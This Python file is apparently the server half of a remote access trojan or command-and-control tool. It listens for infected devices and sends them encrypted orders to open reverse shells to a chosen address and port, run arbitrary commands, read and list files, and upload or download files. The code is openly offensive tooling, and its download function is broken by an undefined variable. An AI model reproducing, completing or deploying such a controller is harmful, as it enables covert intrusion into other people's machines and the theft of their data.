from globals import *
class SOCKET():
    def __init__(self, address, port):
        self.address = address
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.stopped = False
        self.start()
    def revshell(self, id, address, port):
        """Open a Reverse Shell to a given Address:Port
        Args:
            id (int): Connection ID
            address (str): Receiver Address
            port (int): Receiver Port

        Returns:
            bool: True if success, False if not
            str: Message
        """ 
        try:
            conn, addr = self.connections[id]
        except:
            return False, "Connection not found"
        conn.send(self.encrypt(f"SHELL:{address}:{port}"))
        try:
            output = self.decrypt(conn.recv(1024))
        except:
            return False, ""
        else:
            if output == "0":
                return False, "Couldn't open a Reverse Shell"
            else:
                return True, output
    def decrypt(self, data):
        # Decrypt the data
        return self.fernet.decrypt(data).decode()

    def encrypt(self, data):
        # Encrypt the data
        return self.fernet.encrypt(data.encode())

    def refresh_connections(self):
        # Check if the connections are still alive
        while True:
            # Check if Server is stopped
            if self.stopped:
                break
            for conn_i in self.connections:
                conn = conn_i[0]
                try:
                    conn.send(self.encrypt("alive:alive"))
                except:
                    self.connections.remove(conn_i)
                    log(f"Connection from {conn_i[1]} has been lost.", alert="error")
            time.sleep(10)
    def rce(self, id, cmd):
        """Send a Cmd to a Device and return the Output
        Args:
            id (int): Connection ID
            cmd (str): Command to execute

        Returns:
            bool: True if success, False if not
            str: Output of the command
        """        
        try:
            conn, addr = self.connections[id]
        except:
            return False, "Connection not found"
        conn.send(self.encrypt(f"CMD:{cmd}"))
        try:
            output = self.decrypt(conn.recv(1024))
        except:
            return False, ""
        else:
            return True, output
    def get_device_infos(self, id):
        """Get Infos about a Device
        Args:
            id (int): Connection ID
        Returns:
            bool: True if success, False if not
            str: Infos about the Device
        """  
        try:
            conn, addr = self.connections[id]
        except:
            return False, "Connection not found"
        conn.send(self.encrypt(f"INFOS:"))
        try:
            output = self.decrypt(conn.recv(1024))
        except:
            return False, ""
        else:
            return True, output

    def load_module(self, id, module):
        # Send the Module to the Device
        try:
            conn, addr = self.connections[id]
        except:
            return False, "Connection not found"
        pass

    def execute_module(self, id, module):
        # Send a Request to execute a Module
        # Check if Modules is loaded
        # Get Output from the Module
        pass

    def get_directory_contents(self, id, dir):
        """Get the contents of a directory
        Args:
            id (int): Connection ID
            dir (str): Directory to get the contents of

        Returns:
            bool: True if success, False if not
            str: Files in the directory or an Error Message
        """  
        try:
            conn, addr = self.connections[id]
        except:
            return False, "Connection not found"
        conn.send(self.encrypt(f"dir:{dir}"))
        try:
            output = self.decrypt(conn.recv(1024))
        except:
            return False, ""
        else:
            return True, output

    def get_file_contents(self, id, path):
        try:
            conn, addr = self.connections[id]
        except:
            return False, "Connection not found"
        conn.send(self.encrypt(f"content:{path}"))
        try:
            output = self.decrypt(conn.recv(1024))
        except:
            return False, ""
        else:
            return True, output

    def listen(self):
        while True:
            # Check if Server stopped
            if self.stopped:
                break
            try:
                conn, addr = self.server.accept()
                self.server.listen()
            except Exception as e:
                logging.error(e)
                exit()
            else:
                self.connections.append((conn, addr))
                conn.send(self.key)
                ph_print(f"New Connection initialised from {addr}")
                logging.info(f"New Connection initialised from {addr}")

    def start(self):
        self.connections = []
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        ADDR = (self.address, self.port)
        try:
            self.server.bind(ADDR)
        except:
            log("Port is already in use.", alert="critical")
            raise SystemExit
        self.server.listen()
        # Start the Listener and Refresher
        self.listener = threading.Thread(target=self.listen, name="Listener")
        self.listener.start()
        self.refresher = threading.Thread(target=self.refresh_connections, name="Refresher")
        self.refresher.start()

    def stop(self):
        # Stop the Server
        self.server.shutdown(socket.SHUT_RDWR)
        self.stopped = True
    def status(self):
        """Get Status of the Server
        
        Returns:
            bool: True if socket is running, False if not
            bool: True if listener is running, False if not
            bool: True if refresher is running, False if not"""
        # Return the Status of the Server
        return self.stopped, self.listener.is_alive(), self.refresher.is_alive()
    def file_upload(self, id, fil, path):
        """Upload a File to a Device
        Args:
            id (int): Connection ID
            fil (string): File to Upload	
            path (string): Path to Upload the File to

        Returns:
            bool: True if success, False if not
            str: Error or Success Message
        """
        try:
            conn, addr = self.connections[id]
        except:
            return False, "Connection not found"
        try:
            f = open(fil, "rb")
            fil = fil.split("/")
            conn.send(self.encrypt(f"file-u:{fil[-1]}|{path}"))
            time.sleep(1)
            conn.sendfile(f)
            status = self.decrypt(conn.recv(1024))
            if status == "0":
                raise Exception("File Upload Failed")
        except:
            return False, "File could not be uploaded"
        else:
            return True, "File uploaded"

    def file_download(self, id, device_path, own_path):
        """Upload a File to a Device
        Args:
            id (int): Connection ID
            fil (string): File to Upload	
            device_path (string): Path to Download the File from
            own_path (string): Path to Download the File to

        Returns:
            bool: True if success, False if not
            str: Error or Success Message
        """
        try:
            conn, addr = self.connections[id]
        except:
            return False, "Connection not found"
        try:
            f = open(fil, "rb")
            fil = fil.split("/")
            conn.send(self.encrypt(f"file-d:{device_path}"))
            fil = conn.recv(1024)
            if fil == "0":
                raise Exception
            with open(own_path, "wb") as f:
                f.write(fil)
        except:
            return False, "File not found"
        else:
            return True, "File downloaded"